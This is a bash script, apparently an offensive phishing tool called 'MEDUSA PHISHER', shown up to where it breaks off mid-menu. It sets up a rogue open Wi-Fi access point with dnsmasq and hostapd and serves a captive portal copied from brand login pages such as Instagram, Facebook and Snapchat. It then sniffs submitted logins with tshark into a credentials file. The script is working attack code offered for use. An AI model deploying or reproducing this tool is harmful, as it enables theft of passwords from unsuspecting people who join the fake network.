#!/bin/bash

# Function to clear the terminal
clear_terminal() {
    clear
}

# Function to display the big welcome message
big_welcome() {
    echo -e "\e[1;94m"
    echo "                          __  __          _                   ____  _     _     _  "
    echo "                         |  \/  | ___  __| |_   _ ___  __ _  |  _ \| |__ (_)___| |__   ___ _ __  "
    echo "                         | |\/| |/ _ \/ _\`| | | / __|/ _\`| | |_) | '_ \| / __| '_ \ / _ \ '__| "
    echo "                         | |  | |  __/ (_| | |_| \__ \ (_| | |  __/| | | | \__ \ | | |  __/ |  "  
    echo "                         |_|  |_|\___|\__,_|\__,_|___/\__,_| |_|   |_| |_|_|___/_| |_|\___|_|  MEDUSA PHISHER  v1.0 CODED BY: @Adrilaw  CREDIT TO FOR SITES TEMPLETE: https://github.com/8L4NK/blackeye/"
    echo -e "\e[1;33m"
}

# Function to start fake AP with captive portal
start_fake_ap() {
    server_option=$1
    echo "Starting fake access point with captive portal using server option: $server_option..."
    
    # Start dnsmasq
    echo "interface=$interface" > dnsmasq.conf
    echo "dhcp-range=192.168.1.2,192.168.1.254,255.255.255.0,24h" >> dnsmasq.conf
    dnsmasq -C dnsmasq.conf -B &
    
    # Start hostapd with the selected interface
    echo "interface=$interface" > hostapd.conf
    echo "driver=nl80211" >> hostapd.conf
    echo "ssid=OpenWiFi" >> hostapd.conf
    echo "hw_mode=g" >> hostapd.conf
    echo "channel=6" >> hostapd.conf
    hostapd -B hostapd.conf
    
    # Serve captive portal pages using specified server option
    cp "./sites/$server_option/index.html" /var/www/html/index.html
    echo "RewriteEngine On" > /var/www/html/.htaccess
    echo "RewriteRule ^(.*)$ index.html [L]" >> /var/www/html/.htaccess
    
    # Start Apache web server
    service apache2 start
    
    echo "Captive portal started with server option: $server_option"

    # Start credential capturing tool
    echo "Waiting for credentials..."
    xterm -e "tshark -i $interface -Y 'http.request.method == POST && http.request.uri.path == \"/login.php\"' -T fields -e http.request.method -e http.request.uri.path -e http.request.uri.query -e http.request.body -E separator='|' >> creds.txt" &
}

# Function to create a custom phishing page
createpage() {
    echo "Creating custom phishing page..."
    # Your custom phishing page creation logic here
    # This function is a placeholder and should be replaced with your actual logic
}

# Function to display the menu for phishing options
menu() {
    clear_terminal
    big_welcome
    printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;91m Instagram\e[0m      \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;91m IGFollowers\e[0m   \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;91m Custom\e[0m\n"                                
    printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;91m Facebook\e[0m       \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;91m eBay\e[0m                 \n"
    printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;91m Snapchat\e[0m       \e[1;
